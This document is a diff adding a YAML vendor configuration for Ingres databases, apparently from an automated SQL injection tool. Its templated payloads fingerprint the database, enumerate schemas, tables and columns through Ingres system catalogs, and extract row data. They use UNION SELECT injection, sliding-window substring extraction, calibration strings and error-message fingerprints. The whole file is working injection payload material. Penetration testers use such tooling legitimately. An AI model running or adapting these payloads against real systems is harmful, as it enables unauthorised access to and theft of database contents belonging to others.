@@ -1,0 +1,124 @@
+vendor: Ingres
+# jdbc:ingres://localhost:II7/demodb
+
+resource:
+ info: |
+  select
+      dbmsinfo('_version')
+      || '${enclose_value_sql}'
+      || dbmsinfo('database')
+      || '${enclose_value_sql}'
+      || dbmsinfo('session_user')
+      || ${trail_hex}
+      r
+
+ schema:
+  database: |
+   select
+       rr
+       || ${trail_hex}
+       r
+   from (
+       select
+           ${enclose_value_hex}
+           || trim(t.schema_name)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct schema_name from iischema) t,
+           (select distinct schema_name from iischema) t1
+       where t.schema_name >= t1.schema_name
+       group by 1
+       ${limit}
+   ) a
+
+  table: |
+   select
+       rr
+       || ${trail_hex}
+       r
+   from (
+       select
+           ${enclose_value_hex}
+           || trim(t.table_name)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct table_name from iiingres_tables where table_owner = '${database}') t,
+           (select distinct table_name from iiingres_tables where table_owner = '${database}') t1
+       where t.table_name >= t1.table_name
+       group by 1
+       ${limit}
+   ) a
+
+  column: |
+   select
+       rr
+       || ${trail_hex}
+       r
+   from (
+       select
+           ${enclose_value_hex}
+           || trim(t.column_name)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct column_name from iiocolumns where table_owner = '${database}' and table_name = '${table}') t,
+           (select distinct column_name from iiocolumns where table_owner = '${database}' and table_name = '${table}') t1
+       where t.column_name >= t1.column_name
+       group by 1
+       ${limit}
+   ) a
+
+  row:
+   query: |
+    select
+        rr
+        ||${trail_hex}
+        r
+    from (
+        select
+            ${enclose_value_hex}
+            || trim(t.s)
+            || '${separator_qte_sql}0${enclose_value_sql}'
+            rr
+        from
+            (select distinct ${fields} s from "${database}".${table}) t,
+            (select distinct ${fields} s from "${database}".${table}) t1
+        where t.s >= t1.s
+        group by 1
+        ${limit}
+    ) a
+   fields:
+    field: trim(ifnull(varchar(${field.value}), ''))"
+    concat: "|| 0x7f ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   '${lead}'
+   || substr(
+       r,
+       ${window.char},
+       65536
+   ) r
+   from (
+       ${injection}
+   )
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select 1337${indice}7330%2b1 r
+  calibrator: |
+   rpad(
+       '${calibrator_sql}',
+       1024,
+       '${calibrator_sql}'
+   )
+  limitBoundary: 1
+  fingerprint:
+   errorMessage:
+    - Non-terminated string
+
+ normal:
+  indices: union select ${result_range} from (${indice_unique})b
+  capacity: "'${lead}${indice}' || ${calibrator}"
+  orderBy: order by 1337
